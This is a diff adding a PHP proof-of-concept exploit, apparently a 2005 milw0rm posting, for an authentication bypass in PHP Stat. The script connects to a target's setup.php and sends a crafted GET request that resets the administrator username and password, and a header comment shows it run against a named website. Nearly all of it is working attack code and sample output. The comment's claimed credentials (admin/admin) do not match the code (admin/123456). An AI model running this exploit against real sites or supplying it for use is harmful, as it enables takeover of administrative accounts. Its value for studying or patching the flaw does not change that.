@@ -1,0 +1,112 @@
+<?
+
+/*
+
+**************************************************************
+PHP Stat Administrative User Authentication Bypass POC Exploit
+     Code by Nikyt0x - Soulblack Security Research
+**************************************************************
+
+Advisory: 
+ http://www.soulblack.com.ar/repo/papers/phpstat_advisory.txt
+
+Saludos:                                        
+   Soulblack Staff, Status-x, NeosecurityTeam,
+   KingMetal, SWP, Trespasser...
+
+nikyt0x@gmail.com
+http://www.nikyt0x.tk
+
+**************************************************************
+**This Exploit Change Admin Username and Password
+**Username: admin
+**Password: admin
+**************************************************************
+
+
+php sbphpstatpoc.php www.spazfarm.com /spazstats/setup.php
+
+          ==============================================================
+          PHP Stat Administrative User Authentication Bypass POC Exploit
+          ==============================================================
+                     by Nikyt0x - Soulblack Security Research
+
+     [+] Testing: www.spazfarm.com
+     [+] Socket
+     [+] Sending Exploit
+     [+] OK
+
+     Open www.spazfarm.com/spazstats/setup.php
+
+     Username: admin
+     Password: 123456
+
+**************************************************************
+*/
+
+// username and password
+
+$username = "admin";
+$password = "123456";
+
+function sh0w()
+{
+echo "\n          ==============================================================\n";
+echo "          PHP Stat Administrative User Authentication Bypass POC Exploit\n";
+echo "          ==============================================================\n";
+echo "                     by Nikyt0x - Soulblack Security Research\n\n";
+}
+
+if ($argc != 3)
+{
+sh0w();
+echo "\n\n          Usage:\n                   sbphpstatpoc.php www.site.com /dir/to/setup.php\n";
+exit();
+}
+
+
+if(!ereg('setup.php',$argv[2])) {
+   echo "URL to setup.php Incorrect.\n";
+   exit(0);
+}
+
+sh0w();
+
+echo "     [+] Testing: $argv[1]\n";
+
+$s0ck3t = fsockopen($argv[1], 80);
+
+if (!$s0ck3t) {
+   echo "     [-] Socket\n";
+   exit(0);
+} else {
+
+    $petici0n  = "GET $argv[2]?check=yes&username=$username&password=$password HTTP/1.1\r\n";
+    $petici0n .= "Host: $argv[1]\r\n";
+    $petici0n .= "Connection: Close\r\n\r\n";
+   
+   echo "     [+] Socket\n";
+
+if(!fwrite($s0ck3t, $petici0n))
+   {
+   echo "     [-] Sending Exploit\n";
+   exit(0);
+   }
+echo "     [+] Sending Exploit\n";
+
+ while (!feof($s0ck3t)) {
+       $g3tdata = fgets($s0ck3t, 1024);
+	   if (eregi('Setup has been updated',$g3tdata))
+	   {
+	   echo "     [+] OK\n\n";
+           echo "     Open $argv[1]$argv[2]\n\n     Username: $username\n     Password: $password\n";
+           exit();
+           }
+
+}
+fclose($s0ck3t);
+}
+
+?>
+
+# milw0rm.com [2005-05-30]
